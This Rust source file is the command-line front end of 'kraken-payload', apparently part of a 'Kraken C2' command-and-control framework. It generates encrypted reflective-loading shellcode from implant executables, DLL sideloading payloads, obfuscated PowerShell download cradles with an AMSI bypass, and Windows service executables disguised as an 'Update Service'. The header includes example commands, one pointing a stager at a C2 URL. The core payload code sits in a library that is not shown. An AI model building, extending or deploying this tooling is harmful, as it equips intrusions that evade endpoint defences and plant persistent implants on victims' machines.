//! `kraken-payload` — CLI for Kraken C2 payload generation.
//!
//! # Subcommands
//! ```text
//! kraken-payload shellcode   --input implant.exe --xor-key 0x41 --arch x64
//! kraken-payload dll         --export DllGetClassObject --target version.dll
//! kraken-payload powershell  --url https://c2/stager --amsi-bypass --obfuscate
//! kraken-payload service-exe --name KrakenSvc --display "Kraken Update Service"
//! ```

use anyhow::Result;
use clap::{Parser, Subcommand, ValueEnum};
use std::path::PathBuf;

/// Kraken C2 payload generation toolkit.
///
/// Generates shellcode, DLLs, PowerShell stagers, and service EXE
/// templates for engagement delivery.
#[derive(Debug, Parser)]
#[command(name = "kraken-payload", version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Debug, Subcommand)]
enum Commands {
    /// Generate position-independent shellcode from an implant PE.
    ///
    /// Wraps the implant in a PIC bootstrap stub that performs PEB walking,
    /// API resolution, XOR decryption, and reflective PE loading.
    Shellcode(ShellcodeArgs),

    /// Generate a DLL payload with configurable exports for sideloading.
    ///
    /// Outputs C source, .def file, and build script for MinGW
    /// cross-compilation.
    Dll(DllArgs),

    /// Generate a PowerShell download cradle or inline stager.
    ///
    /// Supports AMSI bypass, obfuscation, and base64-encoded command
    /// output formats.
    Powershell(PowerShellArgs),

    /// Generate a Windows service EXE template.
    ///
    /// Creates a Rust source template with ServiceMain, control handler,
    /// and implant thread scaffolding.
    ServiceExe(ServiceExeArgs),

    /// List known DLL sideloading targets.
    ListTargets,
}

// ── Shellcode subcommand ──

#[derive(Debug, Parser)]
struct ShellcodeArgs {
    /// Path to the implant EXE to wrap.
    #[arg(short, long)]
    input: PathBuf,

    /// Output file path for the shellcode blob.
    #[arg(short, long, default_value = "shellcode.bin")]
    output: PathBuf,

    /// XOR key byte for payload encryption (hex, e.g. 0x41).
    #[arg(long, default_value = "0x41", value_parser = parse_hex_u8)]
    xor_key: u8,

    /// Target architecture.
    #[arg(long, default_value = "x64")]
    arch: ArchArg,

    /// Eliminate null bytes from the output.
    #[arg(long, default_value_t = false)]
    null_free: bool,
}

// ── DLL subcommand ──

#[derive(Debug, Parser)]
struct DllArgs {
    /// Primary export function name.
    #[arg(short, long, default_value = "DllGetClassObject")]
    export: String,

    /// Target DLL to mimic (loads exports from sideload target DB).
    #[arg(short, long)]
    target: Option<String>,

    /// Output directory for generated files.
    #[arg(short, long, default_value = ".")]
    output_dir: PathBuf,

    /// Run implant in a new thread from DllMain (recommended).
    #[arg(long, default_value_t = true)]
    thread_start: bool,
}

// ── PowerShell subcommand ──

#[derive(Debug, Parser)]
struct PowerShellArgs {
    /// URL the cradle will download the payload from.
    #[arg(short, long)]
    url: String,

    /// Include an AMSI bypass prefix.
    #[arg(long, default_value_t = false)]
    amsi_bypass: bool,

    /// Obfuscate cmdlet names and string literals.
    #[arg(long, default_value_t = false)]
    obfuscate: bool,

    /// Output format.
    #[arg(long, default_value = "one-liner")]
    format: PsFormatArg,

    /// Write output to file instead of stdout.
    #[arg(short, long)]
    output: Option<PathBuf>,
}

// ── Service EXE subcommand ──

#[derive(Debug, Parser)]
struct ServiceExeArgs {
    /// Windows service name.
    #[arg(short, long, default_value = "KrakenSvc")]
    name: String,

    /// Human-readable display name.
    #[arg(short, long, default_value = "Kraken Update Service")]
    display: String,

    /// Path to implant PE (informational — embedded as a comment).
    #[arg(short, long, default_value = "")]
    payload: String,

    /// Output directory for generated template files.
    #[arg(short, long, default_value = ".")]
    output_dir: PathBuf,
}

// ── Value enums for clap ──

#[derive(Debug, Clone, Copy, ValueEnum)]
enum ArchArg {
    X64,
    X86,
}

impl From<ArchArg> for payload_builder::Arch {
    fn from(a: ArchArg) -> Self {
        match a {
            ArchArg::X64 => payload_builder::Arch::X64,
            ArchArg::X86 => payload_builder::Arch::X86,
        }
    }
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum PsFormatArg {
    OneLiner,
    EncodedCommand,
    Script,
}

impl From<PsFormatArg> for payload_builder::powershell::PsFormat {
    fn from(f: PsFormatArg) -> Self {
        match f {
            PsFormatArg::OneLiner => payload_builder::powershell::PsFormat::OneLiner,
            PsFormatArg::EncodedCommand => payload_builder::powershell::PsFormat::EncodedCommand,
            PsFormatArg::Script => payload_builder::powershell::PsFormat::Script,
        }
    }
}

/// Parse a hex byte string like "0x41" or "41" into a u8.
fn parse_hex_u8(s: &str) -> Result<u8, String> {
    let s = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")).unwrap_or(s);
    u8::from_str_radix(s, 16).map_err(|e| format!("invalid hex byte: {}", e))
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Shellcode(args) => cmd_shellcode(args),
        Commands::Dll(args) => cmd_dll(args),
        Commands::Powershell(args) => cmd_powershell(args),
        Commands::ServiceExe(args) => cmd_service_exe(args),
        Commands::ListTargets => cmd_list_targets(),
    }
}

fn cmd_shellcode(args: ShellcodeArgs) -> Result<()> {
    let payload = std::fs::read(&args.input)?;
    let config = payload_builder::shellcode::ShellcodeConfig {
        payload_path: args.input.display().to_string(),
        xor_key: args.xor_key,
        arch: args.arch.into(),
        null_free: args.null_free,
    };

    eprintln!(
        "[*] Generating {} shellcode (XOR key: 0x{:02X}, null-free: {})",
        config.arch, config.xor_key, config.null_free
    );

    let shellcode = payload_builder::shellcode::generate_shellcode(&payload, &config)?;

    std::fs::write(&args.output, &shellcode)?;
    eprintln!(
        "[+] Wrote {} bytes to {}",
        shellcode.len(),
        args.output.display()
    );

    Ok(())
}

fn cmd_dll(args: DllArgs) -> Result<()> {
    let config = payload_builder::dll::DllConfig {
        payload_path: String::new(),
        export_name: args.export,
        target_dll: args.target.clone(),
        thread_start: args.thread_start,
    };

    eprintln!(
        "[*] Generating DLL template (target: {})",
        args.target.as_deref().unwrap_or("custom")
    );

    let output = payload_builder::dll::generate_dll(&config)?;

    let dir = &args.output_dir;
    std::fs::create_dir_all(dir)?;

    std::fs::write(dir.join("payload.c"), &output.source)?;
    std::fs::write(dir.join("payload.def"), &output.def_file)?;
    std::fs::write(dir.join("build.sh"), &output.build_script)?;

    // Make build script executable on Unix.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(
            dir.join("build.sh"),
            std::fs::Permissions::from_mode(0o755),
        )?;
    }

    eprintln!("[+] Generated DLL template files in {}", dir.display());
    eprintln!("    payload.c   — C source with DllMain + export stubs");
    eprintln!("    payload.def — Module definition file");
    eprintln!("    build.sh    — MinGW cross-compilation script");

    Ok(())
}

fn cmd_powershell(args: PowerShellArgs) -> Result<()> {
    let config = payload_builder::powershell::PowerShellConfig {
        url: args.url,
        amsi_bypass: args.amsi_bypass,
        obfuscate: args.obfuscate,
        output_format: args.format.into(),
    };

    eprintln!(
        "[*] Generating PowerShell stager (AMSI bypass: {}, obfuscate: {})",
        config.amsi_bypass, config.obfuscate
    );

    let script = payload_builder::powershell::generate_powershell(&config)?;

    match args.output {
        Some(path) => {
            std::fs::write(&path, &script)?;
            eprintln!("[+] Wrote stager to {}", path.display());
        }
        None => {
            println!("{}", script);
        }
    }

    Ok(())
}

fn cmd_service_exe(args: ServiceExeArgs) -> Result<()> {
    let config = payload_builder::service::ServiceConfig {
        service_name: args.name,
        display_name: args.display,
        payload_path: args.payload,
    };

    eprintln!(
        "[*] Generating service EXE template (name: {})",
        config.service_name
    );

    let output = payload_builder::service::generate_service_template(&config)?;

    let dir = &args.output_dir;
    std::fs::create_dir_all(dir)?;

    std::fs::write(dir.join("main.rs"), &output.source)?;
    std::fs::write(dir.join("Cargo.toml"), &output.cargo_toml)?;
    std::fs::write(dir.join("install.cmd"), &output.install_commands)?;

    eprintln!("[+] Generated service template files in {}", dir.display());
    eprintln!("    main.rs      — Rust service source");
    eprintln!("    Cargo.toml   — Cargo manifest");
    eprintln!("    install.cmd  — SC install/cleanup commands");

    Ok(())
}

fn cmd_list_targets() -> Result<()> {
    let targets = payload_builder::sideload_targets::list_targets();
    println!("{:<25} {:<18} {:<50} {}", "Application", "DLL", "Path", "Exports");
    println!("{}", "-".repeat(120));
    for t in targets {
        println!(
            "{:<25} {:<18} {:<50} {}",
            t.application,
            t.dll_name,
            t.search_path,
            t.expected_exports.join(", ")
        );
    }
    eprintln!("\n[*] {} known sideload targets", targets.len());
    Ok(())
}
